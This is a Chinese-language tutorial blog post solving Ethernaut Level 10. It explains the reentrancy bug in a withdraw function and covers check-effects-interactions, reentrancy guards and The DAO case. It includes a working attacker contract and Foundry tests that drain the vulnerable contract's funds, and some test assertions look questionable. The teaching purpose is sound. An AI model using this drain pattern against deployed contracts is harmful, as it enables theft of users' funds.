---
title: 'Ethernaut Level 10: Re-entrancy - 经典重入攻击详解'
date: 2025-01-25 14:30:00
updated: 2025-01-25 14:30:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 重入攻击
  - Reentrancy
  - 智能合约安全
  - Solidity
  - CEI模式
series: Ethernaut Foundry Solutions
excerpt: "深入学习最著名的智能合约攻击技术 - 重入攻击，理解其原理、实现和防护措施，这是每个智能合约开发者必须掌握的安全知识。"
---

# 🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解

> **关卡链接**: [Ethernaut Level 10 - Re-entrancy](https://ethernaut.openzeppelin.com/level/10)  
> **攻击类型**: 重入攻击 (Reentrancy Attack)  
> **难度**: ⭐⭐⭐⭐☆  
> **历史影响**: The DAO 攻击事件 (2016年)

## 📋 挑战目标

这是智能合约安全领域最经典的攻击类型之一：

1. **窃取合约资金** - 提取超过自己存款金额的以太币
2. **理解重入原理** - 掌握状态更新时序问题
3. **学习防护措施** - 了解如何编写安全的提款函数

## 🔍 漏洞分析

### 合约源码分析

```solidity
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  // 🚨 漏洞函数
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后
      }
    }
  }
}
```

### 漏洞识别

重入攻击的根本原因是 **检查-效果-交互 (CEI)** 模式的违反：

```solidity
function withdraw(uint _amount) public {
    // ✅ 检查 (Check)
    if(balances[msg.sender] >= _amount) {
        
        // ❌ 交互 (Interaction) - 过早进行外部调用
        (bool result,) = msg.sender.call{value:_amount}("");
        
        if(result) {
            // ❌ 效果 (Effect) - 状态更新太晚
            balances[msg.sender] -= _amount;
        }
    }
}
```

### 攻击原理

1. **恶意合约存款** - 向目标合约存入少量资金
2. **调用提款函数** - 触发 `withdraw()` 函数
3. **接收回调** - 在 `call` 执行时触发恶意合约的 `receive()` 函数
4. **递归调用** - 在状态更新前再次调用 `withdraw()`
5. **重复提取** - 由于余额未更新，可以多次提取资金

### 攻击流程图

```
用户调用 withdraw(1 ether)
    ↓
检查 balances[attacker] >= 1 ether ✅
    ↓
发送 1 ether 到攻击者合约
    ↓
攻击者合约的 receive() 被触发
    ↓
再次调用 withdraw(1 ether)
    ↓
检查 balances[attacker] >= 1 ether ✅ (余额未更新!)
    ↓
再次发送 1 ether...
    ↓
如此重复，直到合约余额耗尽
```

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

contract ReentrancyAttacker {
    Reentrance public target;
    uint public amount;
    
    constructor(address _target) {
        target = Reentrance(_target);
    }
    
    function attack() external payable {
        amount = msg.value;
        
        // 步骤1: 先存入一些资金建立余额
        target.donate{value: amount}(address(this));
        
        // 步骤2: 开始重入攻击
        target.withdraw(amount);
    }
    
    // 重入攻击的核心 - receive函数
    receive() external payable {
        if (address(target).balance >= amount) {
            // 递归调用withdraw，实现重入
            target.withdraw(amount);
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReentranceTest is Test {
    Reentrance public reentrance;
    ReentrancyAttacker public attacker;
    
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    address public attackerAddr = makeAddr("attacker");

    function setUp() public {
        // 部署目标合约
        reentrance = new Reentrance();
        
        // 给用户一些初始资金
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(attackerAddr, 2 ether);
        
        // 模拟正常用户存款
        vm.prank(user1);
        reentrance.donate{value: 5 ether}(user1);
        
        vm.prank(user2);
        reentrance.donate{value: 5 ether}(user2);
        
        // 部署攻击合约
        vm.prank(attackerAddr);
        attacker = new ReentrancyAttacker(address(reentrance));
    }

    function testReentrancyAttack() public {
        uint256 contractBalanceBefore = address(reentrance).balance;
        uint256 attackerBalanceBefore = attackerAddr.balance;
        
        console.log("合约余额 (攻击前):", contractBalanceBefore);
        console.log("攻击者余额 (攻击前):", attackerBalanceBefore);
        
        // 执行重入攻击
        vm.prank(attackerAddr);
        attacker.attack{value: 1 ether}();
        
        uint256 contractBalanceAfter = address(reentrance).balance;
        uint256 attackerBalanceAfter = attacker.getBalance();
        
        console.log("合约余额 (攻击后):", contractBalanceAfter);
        console.log("攻击者余额 (攻击后):", attackerBalanceAfter);
        
        // 验证攻击成功
        assertEq(contractBalanceAfter, 0);
        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金
    }
    
    function testReentrancyDetails() public {
        vm.prank(attackerAddr);
        
        // 记录每次withdraw调用
        vm.recordLogs();
        attacker.attack{value: 1 ether}();
        
        // 验证攻击者的余额记录
        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0
        assertEq(address(reentrance).balance, 0); // 合约被掏空
    }
}
```

### 运行测试

```bash
# 运行重入攻击测试
forge test --match-contract ReentranceTest -vvv

# 输出应该显示合约余额被完全掏空
```

## 🛡️ 防御措施

### 1. CEI 模式 (Check-Effects-Interactions)

```solidity
contract SecureReentrance {
    mapping(address => uint) public balances;
    
    function withdraw(uint _amount) public {
        // ✅ 检查 (Check)
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // ✅ 效果 (Effect) - 先更新状态
        balances[msg.sender] -= _amount;
        
        // ✅ 交互 (Interaction) - 最后进行外部调用
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

### 2. 重入锁 (Reentrancy Guard)

```solidity
contract ReentrancyGuarded {
    bool private locked;
    mapping(address => uint) public balances;
    
    modifier noReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw(uint _amount) public noReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

### 3. 使用 OpenZeppelin 的 ReentrancyGuard

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeContract is ReentrancyGuard {
    mapping(address => uint) public balances;
    
    function withdraw(uint _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

### 4. 使用 transfer() 而非 call()

```solidity
// ⚠️ 有限防护（不推荐作为唯一防护措施）
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient balance");
    
    balances[msg.sender] -= _amount;
    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300
}
```

## 📚 核心知识点

### 1. 重入攻击类型

| 类型 | 描述 | 示例 |
|------|------|------|
| **单函数重入** | 攻击同一个函数 | 本关卡的 `withdraw()` |
| **跨函数重入** | 攻击不同函数 | `withdraw()` → `transfer()` |
| **跨合约重入** | 攻击不同合约 | DeFi 协议间的复杂重入 |

### 2. Gas 限制对比

```solidity
// transfer/send: 2300 gas (不足以进行重入)
payable(msg.sender).transfer(amount);

// call: 转发所有剩余 gas (可能导致重入)
(bool success,) = msg.sender.call{value: amount}("");
```

### 3. 状态更新时序

```solidity
// ❌ 错误模式
function vulnerable() public {
    require(condition);        // Check
    externalCall();           // Interaction (危险!)
    updateState();            // Effect (太晚了)
}

// ✅ 正确模式
function secure() public {
    require(condition);        // Check
    updateState();            // Effect (先更新状态)
    externalCall();           // Interaction (安全)
}
```

## 🏛️ 历史案例

### The DAO 攻击 (2016年6月)

- **损失**: 360万 ETH (当时价值约6000万美元)
- **原因**: splitDAO 函数存在重入漏洞
- **后果**: 以太坊硬分叉，产生 ETH 和 ETC
- **教训**: 重入攻击的破坏性和防护重要性

### 其他著名案例

1. **Cream Finance** (2021) - 1.3亿美元损失
2. **bZx Protocol** (2020) - 多次重入攻击
3. **Uniswap V1** (早期版本) - 理论漏洞

## 🎯 总结

重入攻击是智能合约安全的基石知识：

- ✅ **理解 CEI 模式的重要性**
- ✅ **掌握多种防护措施的使用**
- ✅ **认识状态管理的关键性**
- ✅ **学习历史案例的教训**

重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。

---

## 🔗 相关链接

- **[上一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**
- **[下一关: Level 11 - Elevator](/2025/01/25/ethernaut-level-11-elevator/)**
- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

---

*安全的合约不仅要做正确的事，还要以正确的顺序做事。* 🔐